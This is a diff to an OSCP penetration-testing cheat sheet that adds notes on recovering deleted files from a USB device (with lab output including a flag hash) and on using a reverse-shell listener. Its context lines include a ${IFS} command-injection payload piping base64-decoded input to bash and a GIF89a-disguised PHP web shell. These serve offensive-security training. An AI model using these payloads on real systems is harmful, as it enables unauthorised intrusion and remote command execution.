@@ -96,6 +96,7 @@ This repository describes cheat sheet and knowledge for OSCP.
 - [JDI](#jdi)
 - [Git](#git)
   - [Dump .git](#dump-git)
+- [Recover deleted file](#recover-deleted-file)
 - [Linux command](#linux-command)
   - [Basic command](#basic-command-1)
     - [Show allowing commands as root user](#show-allowing-commands-as-root-user)
@@ -146,6 +147,7 @@ This repository describes cheat sheet and knowledge for OSCP.
   - [php-reverse-shell](#php-reverse-shell)
   - [Reverse shell cheat sheet](#reverse-shell-cheat-sheet)
   - [GIF89a](#gif89a)
+  - [Listening the port for reverse shell](#listening-the-port-for-reverse-shell)
   - [Metasploit](#metasploit)
 - [Metasploit](#metasploit-1)
   - [meterpreter](#meterpreter)
@@ -645,6 +647,39 @@ https://github.com/arthaud/git-dumper
 git-dumper http://siteisup.htb/dev/.git dev
 ```
 
+# Recover deleted file
+When the file is deleted, the metadata of the file is deleted from the filesystem.
+However, the content of the file is not deleted immediately.
+Therefore, the content of the file is still in the file system.
+
+The following example is the finding which is the content in the deleted file.
+```shell
+pi@raspberrypi:/media/usbstick$ sudo strings /dev/sdb
+>r &
+/media/usbstick
+lost+found
+root.txt
+damnit.txt
+>r &
+>r &
+/media/usbstick
+lost+found
+root.txt
+damnit.txt
+>r &
+/media/usbstick
+2]8^
+lost+found
+root.txt
+damnit.txt
+>r &
+3d3e483143ff12ec505d026fa13e020b
+Damnit! Sorry man I accidentally deleted your files off the USB stick.
+Do you know if there is any way to get them back?
+-James
+```
+
+
 # Linux command
 
 ## Basic command
@@ -700,6 +735,7 @@ When we send the payload the encoded command, add decoding command:
 ```shell
 ;echo${IFS}"<your payload here>"${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;
 ```
+
 
 ### rlwrap
 https://linux.die.net/man/1/rlwrap
@@ -899,6 +935,13 @@ GIF89a;
 system($_GET['cmd']);//or you can insert your complete shell code
 ?>
 ```
+
+## Listening the port for reverse shell
+[penelope](https://github.com/brightio/penelope) is a shell handler.
+```shell
+python penelope.py 1234
+```
+
 
 
 ## Metasploit
